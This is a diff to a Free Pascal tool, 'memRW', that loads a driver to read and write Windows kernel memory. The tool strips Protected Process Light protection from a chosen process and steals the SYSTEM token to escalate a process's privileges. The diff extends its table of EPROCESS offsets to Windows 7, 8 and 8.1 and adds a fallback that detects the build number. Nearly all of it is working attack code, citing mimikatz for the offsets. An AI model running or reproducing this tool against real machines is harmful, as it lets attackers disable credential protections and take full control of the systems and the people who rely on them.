@@ -1,16 +1,5 @@
 {$mode delphi}
 
-
-
-
-//EprocessNext, EprocessFlags2, TokenPrivs, SignatureProtect
-//* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
-//* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
-//* 10_1803*/{0x02e8, 0x0300, 0x0040, 0x06c8},
-//* 10_1809*/{0x02e8, 0x0300, 0x0040, 0x06c8},
-//* 10_1903*/{0x02f0, 0x0308, 0x0040, 0x06f8},
-
-
 program memRW;
 
 uses windows,sysutils, udrv, urtcore, untdll;
@@ -19,6 +8,7 @@ type toffsets=record
       EprocessNext:word;
       Token:dword;
       SignatureProtect:dword;
+      ImageFileName:dword;
 end;
 
 
@@ -121,7 +111,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
     //offsets : https://github.com/gentilkiwi/mimikatz/blob/68ac65b426d1b9e1354dd0365676b1ead15022de/mimidrv/kkll_m_process.c#L8
     //should be 00000004
     UniqueProcessId := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext-8);
-    imagefilename:=ReadMemory16bytes(Device, PsInitialSystemProcessAddress + $450);
+    imagefilename:=ReadMemory16bytes(Device, PsInitialSystemProcessAddress + offsets.ImageFileName);
     //clear low 4 bits of _EX_FAST_REF structure
     SystemProcessToken := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.Token) and not 15;
     WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
@@ -134,7 +124,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
     while value<>SystemProcessFlink do
     begin
           UniqueProcessId:=ReadMemoryDWORD64(Device, next-8);
-          imagefilename:=ReadMemory16bytes(Device, next-offsets.EprocessNext+$450);
+          imagefilename:=ReadMemory16bytes(Device, next-offsets.EprocessNext+offsets.ImageFileName);
           protection :=ReadMemoryDword(Device, next-offsets.EprocessNext+offsets.SignatureProtect);
           if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break;
 
@@ -149,7 +139,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
 
           if UniqueProcessId=targetpid then
              begin
-             if action=1 then
+             if (action=1) and (offsets.SignatureProtect<>0) then
                 begin
                 writeln('patching process protection:'+inttostr(UniqueProcessId ));
                 WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,0);  //disable PPL
@@ -157,7 +147,7 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
                 end;
              //https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/
              //
-             if action=2 then
+             if (action=2) and (offsets.Token<>0) then
                 begin
                 writeln('make system');
                 CurrentProcessFastToken := ReadMemoryDWORD64(Device, next-offsets.EprocessNext+ offsets.Token);
@@ -186,7 +176,7 @@ function ReadRegEntry(strSubKey,strValueName: string): string;
   Buffer: array[0..255] of char;
   Size: cardinal;
  begin
-  Result := 'ERROR';
+  Result := '';
   Size := SizeOf(Buffer);
   If RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    PChar(strSubKey),0,KEY_READ,Key) = ERROR_SUCCESS Then
@@ -203,13 +193,18 @@ begin
  begin
  fillchar(offsets,sizeof(offsets),0);
  case strtoint(releaseid) of
- 1703:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
- 1709:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
- 1803:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
- 1809:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
- 1903:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; end;
- 1909:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; end;
- 2004:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
+ 7600:begin    EprocessNext :=$0188;SignatureProtect :=$000; Token :=$208;ImageFileName :=$2e0; end; //7
+ 7601:begin    EprocessNext :=$0188;SignatureProtect :=$000; Token :=$208;ImageFileName :=$2e0; end; //7sp1
+ 9200:begin    EprocessNext :=$02e8;SignatureProtect :=$0648; Token :=$348;ImageFileName :=$438; end; //8.0
+ 9600:begin    EprocessNext :=$02e8;SignatureProtect :=$0678; Token :=$348;ImageFileName :=$438; end; //8.1
+ //
+ 1703:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358;ImageFileName :=$450; end;
+ 1709:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
+ 1803:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
+ 1809:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; ImageFileName :=$450; end;
+ 1903:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; ImageFileName :=$450; end;
+ 1909:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; ImageFileName :=$450; end;
+ 2004:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; ImageFileName :=$5a8; end;
  //20H2:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
  //21H1:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
  else result:=false;
@@ -221,8 +216,10 @@ end;
 begin
 if paramcount=0 then exit;
 ReleaseID:=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseID' );
+if ReleaseID ='' then ReleaseID :=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','CurrentBuildNumber' );
+if ReleaseID ='' then begin writeln('No ReleaseID');exit;end;
 writeln('ReleaseID:'+releaseid);
-if SetOffsets =false then begin writeln('Offsets unknown') end;
+if SetOffsets =false then begin writeln('Offsets unknown');exit; end;
 if (paramcount=2) and (paramstr(1)='load')
    then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
 if (paramcount=2) and (paramstr(1)='unload')
